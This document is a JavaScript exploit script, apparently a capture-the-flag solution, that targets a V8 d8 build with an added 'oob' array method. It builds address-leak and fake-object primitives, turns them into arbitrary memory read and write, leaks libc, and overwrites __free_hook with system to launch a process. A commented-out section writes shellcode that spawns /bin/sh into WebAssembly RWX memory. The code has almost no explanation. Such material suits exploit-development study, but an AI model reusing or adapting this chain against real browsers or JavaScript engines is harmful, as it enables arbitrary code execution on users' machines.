var buf = new ArrayBuffer(16); 
var float64 = new Float64Array(buf); 
var bigUint64 = new BigUint64Array(buf); 

function f2i(f){

	float64[0] = f;
	return bigUint64[0];
}

function i2f(i){

	bigUint64[0] = i;
	return float64[0];
}

function hex(i){

	return "0x" + i.toString(16).padStart(16, "0");
}

function test(){

	print ("Test conversions: \n");
	let a = i2f(0x4014000000000000n); 
	print (a);
}

// test();
var obj = {"a": 1};
var ObjArray = [obj];
var FloatArray = [1.1];
var ObjectMap = ObjArray.oob(); //oob read map
var FloatMap  = FloatArray.oob();


// leak a object's address
function addrOf(obj_to_leak){
	
	ObjArray[0] = obj_to_leak; // put in target
	ObjArray.oob(FloatMap) // ObjArray treat as FloatArray
	let obj_addr = f2i(ObjArray[0]) - 1n; // address as float number
	ObjArray.oob(ObjectMap); // recover
	return obj_addr
}


// Notice, to achieve arbitrary write, we need 
// overwrite certain structures, and to achieve that,
// we need the ability of faking objects ...
function fakeObject(addr_to_fake){

	FloatArray[0] = i2f(addr_to_fake + 1n);
	FloatArray.oob(ObjectMap);
	let fake_obj = FloatArray[0];
	FloatArray.oob(FloatMap); // recover
	return fake_obj;
}


// fake FloatArray, using it's elements as a faked JSArray Object
var fake_array = [
	FloatMap, // map
	i2f(0n), // property, zero non effect
	i2f(0x41414141n), // element ptr
	i2f(0x1000000000n), // length
	1.1,
	2.2
];

var fake_array_address = addrOf(fake_array);
print (hex(fake_array_address));
// %DebugPrint(fake_array);
let fakeobj = fakeObject(fake_array_address - 0x30n); // faking 


// from leak ObjAddress && fakeObj to R/W
function read64(addr){

	fake_array[2] = i2f(addr - 0x10n + 0x1n); // fake elements of Double-Typed
	let leak = f2i(fakeobj[0]);
	return leak;
}

function write64(addr, data){

	fake_array[2] = i2f(addr - 0x10n + 0x1n);
	fakeobj[0] = i2f(data);
}


victim = [1.1, 2.2, 3.3];
let v_addr = addrOf(victim); // GetObj Address
print (hex(read64(v_addr))); // leak


// R/W with WASM module 
/*
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
// var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,138,128,128,128,0,2,96,1,127,1,127,96,0,1,127,2,140,128,128,128,0,1,3,101,110,118,4,112,117,116,115,0,0,3,130,128,128,128,0,1,1,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,1,10,143,128,128,128,0,1,137,128,128,128,0,0,65,16,16,0,26,65,0,11,11,149,128,128,128,0,1,0,65,16,11,15,104,101,108,108,111,44,32,119,111,114,108,100,33,32,0]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});

var f = wasmInstance.exports.main;

var func_addr = addrOf(f);
let sharedinfo_addr = read64(func_addr + 0x18n) - 1n;
let ExportFuncData_addr = read64(sharedinfo_addr + 8n) - 1n;
let instance_addr = read64(ExportFuncData_addr + 0x10n) - 1n;
let rwx_addr = read64(instance_addr + 0x80n);

var data_buf = new ArrayBuffer(118);
var data_view = new DataView(data_buf);


var buf_backingStore_addr = addrOf(data_buf) + 0x20n;
write64(buf_backingStore_addr, rwx_addr);
print("done! \n");
let shellcode = [72,184,1,1,1,1,1,1,1,1,80,72,184,46,121,98,96,109,98,1,1,72,49,4,36,72,184,47,117,115,114,47,98,105,110,80,72,137,231,104,59,49,1,1,129,52,36,1,1,1,1,72,184,68,73,83,80,76,65,89,61,80,49,210,82,106,8,90,72,1,226,82,72,137,226,72,184,1,1,1,1,1,1,1,1,80,72,184,121,98,96,109,98,1,1,1,72,49,4,36,49,246,86,106,8,94,72,1,230,86,72,137,230,106,59,88,15,5];

for(let i = 0; i < shellcode.length; i++){

	data_view.setInt8(i, shellcode[i]);
}

f();
*/


var test_array = [1.1];
var test_addr  = addrOf(test_array);
var map_addr   = read64(test_addr) - 1n;
var property   = read64(map_addr + 0x68n) - 1n;
var constructor= property - 0x250n;
var code       = read64(constructor + 0x30n) -1n;
var target_addr= read64(code + 0x40n);
var d8code     = target_addr & 0xffffffffffff0000n;
let d8addr     = d8code >> 16n;
let d8base     = d8addr - 0xa112c0n;
let d8_getc    = d8base + 0xD0FDD8n;
let getc       = read64(d8_getc);
let libc_base  = getc - 0x87d90n;
let freehook   = libc_base + 0x3ed8e8n;
let system     = libc_base + 0x4f440n;



var data_buf = new ArrayBuffer(118);
var data_view = new DataView(data_buf);
var buf_backingStore_addr = addrOf(data_buf) + 0x20n;
write64(buf_backingStore_addr, freehook);
for (let t = 0; t < 6; t++){

	let idx = BigInt(5 - t);
	let temp = (system >> (idx*8n)) & 0xffn;
	data_view.setUint8(5-t, Number(temp));
}


function get_shell(){

	let getshell_buffer   = new ArrayBuffer(0x1000); // use ArrayBuffer to trigger ptmalloc serve.
	let getshell_dataview = new DataView(getshell_buffer);
	getshell_dataview.setFloat64(0, i2f(0x000000636c616378n));
	// getshell_dataview.setFloat64(8, i2f(0x0000636c6163782fn));
}

get_shell();
// print (hex(freehook));


